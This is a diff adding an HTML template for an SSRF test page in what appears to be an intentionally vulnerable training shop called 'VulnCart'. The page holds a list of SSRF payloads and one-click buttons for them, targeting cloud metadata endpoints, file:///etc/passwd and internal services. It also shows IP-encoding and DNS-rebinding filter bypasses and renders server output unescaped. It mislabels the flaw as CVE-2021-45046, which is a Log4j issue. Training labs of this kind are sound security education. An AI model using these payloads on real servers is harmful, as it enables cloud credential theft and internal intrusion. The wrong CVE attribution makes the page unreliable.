@@ -1,0 +1,240 @@
+{% extends "base.html" %}
+
+{% block title %}SSRF Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2021-45046: SSRF Vulnerability Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates Server-Side Request Forgery (SSRF) vulnerabilities for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>SSRF Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>Server-Side Request Forgery (SSRF) occurs when an attacker can make the server perform requests to unintended locations.</p>
+                
+                <form method="POST" id="ssrfForm">
+                    <div class="mb-3">
+                        <label for="url" class="form-label">URL to Request:</label>
+                        <input type="text" class="form-control" id="url" name="url" 
+                               placeholder="Enter URL to request..." value="http://localhost:8080">
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Test SSRF</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>Local Services:</h6>
+                <code>http://localhost:8080</code><br>
+                <code>http://127.0.0.1:3306</code><br>
+                <code>http://0.0.0.0:22</code>
+                
+                <hr>
+                
+                <h6>Internal Network:</h6>
+                <code>http://192.168.1.1</code><br>
+                <code>http://10.0.0.1</code><br>
+                <code>http://172.16.0.1</code>
+                
+                <hr>
+                
+                <h6>Cloud Metadata:</h6>
+                <code>http://169.254.169.254/latest/meta-data/</code><br>
+                <code>http://metadata.google.internal/</code><br>
+                <code>http://169.254.169.254/metadata/v1/</code>
+                
+                <hr>
+                
+                <h6>File Protocol:</h6>
+                <code>file:///etc/passwd</code><br>
+                <code>file:///proc/version</code><br>
+                <code>file:///sys/class/net/</code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>SSRF Attack Techniques</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Local Service Discovery:</h6>
+                        <ul>
+                            <li><code>http://localhost:8080</code> - Web services</li>
+                            <li><code>http://127.0.0.1:3306</code> - MySQL</li>
+                            <li><code>http://localhost:6379</code> - Redis</li>
+                            <li><code>http://localhost:27017</code> - MongoDB</li>
+                            <li><code>http://localhost:5432</code> - PostgreSQL</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Cloud Metadata Endpoints:</h6>
+                        <ul>
+                            <li><code>http://169.254.169.254/</code> - AWS metadata</li>
+                            <li><code>http://metadata.google.internal/</code> - GCP metadata</li>
+                            <li><code>http://169.254.169.254/metadata/</code> - DigitalOcean</li>
+                            <li><code>http://100.100.100.200/</code> - Alibaba Cloud</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="row mt-3">
+                    <div class="col-md-12">
+                        <h6>Advanced SSRF Techniques:</h6>
+                        <pre><code># Bypass filters with different IP representations
+http://2130706433/  # 127.0.0.1 in decimal
+http://017700000001/  # 127.0.0.1 in octal
+http://0x7f000001/  # 127.0.0.1 in hex
+
+# DNS rebinding
+http://attacker.com/  # Points to internal IP after TTL
+
+# URL encoding
+http://%6c%6f%63%61%6c%68%6f%73%74/  # localhost encoded
+
+# Double encoding
+http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34/</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2021-45046 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>Server-Side Request Forgery (SSRF) occurs when an attacker can make the server perform requests to unintended locations, potentially accessing internal services or sensitive data.</p>
+                
+                <h6>Common Attack Vectors:</h6>
+                <ul>
+                    <li>URL validation bypass</li>
+                    <li>DNS rebinding</li>
+                    <li>Cloud metadata access</li>
+                    <li>Internal service enumeration</li>
+                    <li>File protocol abuse</li>
+                </ul>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Access to internal services</li>
+                    <li>Cloud metadata exfiltration</li>
+                    <li>Internal network reconnaissance</li>
+                    <li>Privilege escalation</li>
+                    <li>Data exfiltration</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Implement strict URL validation</li>
+                    <li>Use allowlist for allowed domains</li>
+                    <li>Block access to private IP ranges</li>
+                    <li>Disable file:// protocol</li>
+                    <li>Use outbound proxies with restrictions</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('ssrfForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const url = document.getElementById('url').value;
+        const resultDiv = document.getElementById('result');
+        
+        fetch('/ssrf', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'url=' + encodeURIComponent(url)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong><br>
+                    <pre>${data.result}</pre>
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    // Quick payload buttons
+    const payloads = [
+        {name: "Localhost", url: "http://localhost:8080"},
+        {name: "127.0.0.1", url: "http://127.0.0.1:3306"},
+        {name: "AWS Metadata", url: "http://169.254.169.254/latest/meta-data/"},
+        {name: "File Protocol", url: "file:///etc/passwd"},
+        {name: "Internal Network", url: "http://192.168.1.1"},
+        {name: "GCP Metadata", url: "http://metadata.google.internal/"},
+        {name: "Decimal IP", url: "http://2130706433/"},
+        {name: "Octal IP", url: "http://017700000001/"}
+    ];
+    
+    payloads.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('url').value = item.url;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+    
+    // Advanced payload buttons
+    const advancedPayloads = [
+        {name: "DNS Rebinding", url: "http://attacker.com/"},
+        {name: "URL Encoded", url: "http://%6c%6f%63%61%6c%68%6f%73%74/"},
+        {name: "Hex IP", url: "http://0x7f000001/"},
+        {name: "Cloud Metadata", url: "http://169.254.169.254/metadata/v1/"}
+    ];
+    
+    advancedPayloads.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-warning btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('url').value = item.url;
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
